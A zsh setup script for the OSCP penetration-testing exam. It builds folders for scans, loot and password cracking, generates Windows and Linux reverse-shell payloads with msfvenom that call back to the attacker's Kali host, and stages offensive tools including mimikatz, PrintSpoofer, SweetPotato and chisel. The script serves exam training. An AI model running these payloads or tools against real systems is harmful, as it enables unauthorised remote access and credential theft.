#!/usr/bin/zsh
# Note: Make sure environment variables are configured before running. Run as kali.
# Sets up directory structure and default files for the exam

# Setup directory structure
mkdir /home/kali/oscp
cd /home/kali/oscp

# Make folders for serving tools and exfiltrating loot
mkdir server
mkdir server/payloads
mkdir server/privesc
mkdir server/pivot
mkdir server/loot

# Make a folder for storing password cracks and custom wordlists
mkdir cracking

# Make directories for external scanning and each host
mkdir external
mkdir external/scan-tcp-1000
mkdir external/scan-upd-100
mkdir external/scan-tcp-all
mkdir external/scan-udp-all
mkdir external/ad-01-$(echo "${ad01}" | cut -d '.' -f 4)
mkdir external/stand-01-$(echo "${stand01}" | cut -d '.' -f 4)
mkdir external/stand-02-$(echo "${stand02}" | cut -d '.' -f 4)
mkdir external/stand-03-$(echo "${stand03}" | cut -d '.' -f 4)

# Make directories for internal scanning and each host
mkdir internal
mkdir internal/scan-tcp-1000
mkdir internal/scan-upd-100
mkdir internal/scan-tcp-all
mkdir internal/scan-udp-all
mkdir internal/ad-02-$(echo "${ad02}" | cut -d '.' -f 4)
mkdir internal/ad-03-$(echo "${ad03}" | cut -d '.' -f 4)

# Make a directory for storing autorecon output
mkdir autorecon

# Make a directory for storing share dump results
mkdir share_dumps

# Make a tools directory
mkdir /home/kali/tools

# ------------------------------------------------------------
# Make target files for internal and external targets

# Setup external targets file for scanning
echo "${ad01}" >> /home/kali/oscp/external/targets.txt
echo "${stand01}" >> /home/kali/oscp/external/targets.txt
echo "${stand02}" >> /home/kali/oscp/external/targets.txt
echo "${stand03}" >> /home/kali/oscp/external/targets.txt

# Setup internal targets file for scanning
echo "${ad02}" >> /home/kali/oscp/internal/targets.txt
echo "${ad03}" >> /home/kali/oscp/internal/targets.txt

# ------------------------------------------------------------
# Setup a password cracking dictionary that can be augmented with any new credentials found

cd /home/kali/oscp/cracking
cp /usr/share/wordlists/rockyou.txt.gz ./
gunzip rockyou.txt.gz
touch found_usernames.txt
touch found_passwords.txt
touch found_dcc2.hashes
touch found_ntlm.hashes
touch found_net_ntlmv2.hashes
touch found_shadow.hashes

# ------------------------------------------------------------
# Prepare commonly served files

cd /home/kali/oscp/server

# Payloads
cd /home/kali/oscp/server/payloads
msfvenom --payload windows/shell_reverse_tcp --platform windows --arch x86 --format exe LHOST="${kali}" LPORT=5001 --out winrev1.exe
msfvenom --payload windows/shell_reverse_tcp --platform windows --arch x86 --format exe LHOST="${kali}" LPORT=5002 --out winrev2.exe
msfvenom --payload windows/shell_reverse_tcp --platform windows --arch x86 --format exe LHOST="${kali}" LPORT=5003 --out winrev3.exe
msfvenom --payload windows/shell_reverse_tcp --platform windows --arch x86 --format exe LHOST="${kali}" LPORT=5004 --out winrev4.exe
msfvenom --payload windows/shell_reverse_tcp --platform windows --arch x86 --format exe LHOST="${kali}" LPORT=5005 --out winrev5.exe
msfvenom --payload windows/shell_reverse_tcp --platform windows --arch x86 --format exe LHOST="${kali}" LPORT=5006 --out winrev6.exe
msfvenom --payload linux/x86/shell_reverse_tcp --platform linux --arch x86 LHOST="${kali}" LPORT=6001 --format elf --out linrev1
msfvenom --payload linux/x86/shell_reverse_tcp --platform linux --arch x86 LHOST="${kali}" LPORT=6002 --format elf --out linrev2
msfvenom --payload linux/x86/shell_reverse_tcp --platform linux --arch x86 LHOST="${kali}" LPORT=6003 --format elf --out linrev3
msfvenom --payload linux/x86/shell_reverse_tcp --platform linux --arch x86 LHOST="${kali}" LPORT=6004 --format elf --out linrev4
msfvenom --payload linux/x86/shell_reverse_tcp --platform linux --arch x86 LHOST="${kali}" LPORT=6005 --format elf --out linrev5
msfvenom --payload linux/x86/shell_reverse_tcp --platform linux --arch x86 LHOST="${kali}" LPORT=6006 --format elf --out linrev6

# Privesc
cd /home/kali/oscp/server/privesc
# PEAS
sudo apt install peass --assume-yes --quiet
cp /usr/share/peass/winpeas/winPEASx64.exe /home/kali/oscp/server/privesc/winpeas.exe
cp /usr/share/peass/winpeas/winPEASx86.exe /home/kali/oscp/server/privesc/winpeas86.exe
cp /usr/share/peass/linpeas/linpeas_linux_amd64 /home/kali/oscp/server/privesc/linpeas
cp /usr/share/peass/linpeas/linpeas.sh /home/kali/oscp/server/privesc/linpeas.sh
# Mimikatz
cp /usr/share/windows-resources/mimikatz/x64/* /home/kali/oscp/server/privesc/
# Powercat and PowerView from shared folder. Shared folder did not work.
# cp /home/kali/Desktop/shared/Payloads/other-privesc/* ./
# Seatbelt
wget https://raw.githubusercontent.com/carlospolop/winPE/refs/heads/master/binaries/seatbelt/SeatbeltNet4AnyCPU.exe -O seatbelt_4.exe --quiet
wget https://raw.githubusercontent.com/carlospolop/winPE/refs/heads/master/binaries/seatbelt/SeatbeltNet3.5AnyCPU.exe -O seatbelt_35.exe --quiet
# PowerUp
wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/refs/heads/master/Privesc/PowerUp.ps1 -O powerup.ps1 --quiet
# PrintSpoofer
wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe -O printspoofer.exe --quiet
wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe -O printspoofer32.exe --quiet
# SweetPotato
wget https://raw.githubusercontent.com/Flangvik/SharpCollection/refs/heads/master/NetFramework_4.5_Any/SweetPotato.exe -O sweetpotato_45.exe --quiet
wget https://raw.githubusercontent.com/Flangvik/SharpCollection/refs/heads/master/NetFramework_4.7_Any/SweetPotato.exe -O sweetpotato_47.exe --quiet
# Pivot
cd /home/kali/oscp/server/pivot
# Get latest chisel for windows and linux
VER=$(curl --silent -qI https://github.com/jpillora/chisel/releases/latest | awk -F '/' '/^location/ {print  substr($NF, 1, length($NF)-1)}');
wget https://github.com/jpillora/chisel/releases/download/"${VER}"/chisel_"${VER#v}"_linux_amd64.gz -O chisel_lin.gz  --quiet
gunzip chisel_lin.gz
wget https://github.com/jpillora/chisel/releases/download/"${VER}"/chisel_"${VER#v}"_windows_amd64.gz -O chisel_win.gz  --quiet
gunzip chisel_win.gz
mv chisel_win chisel_win.exe

# ------------------------------------------------------------

# Setup Tools
cd /home/kali/tools

# Setup pipx
python3 -m pipx ensurepath
source ~/.zshrc

# Install autorecon
pipx install git+https://github.com/Tib3rius/AutoRecon.git

# Install a tool to dump all contents of smb shares
git clone https://github.com/p0daliraius/DumpSMBShare.git

# Install enum4linux-ng
git clone https://github.com/cddmp/enum4linux-ng.git
cd enum4linux-ng
source /home/kali/.venv/bin/activate
python -m pip install -r ./requirements.txt
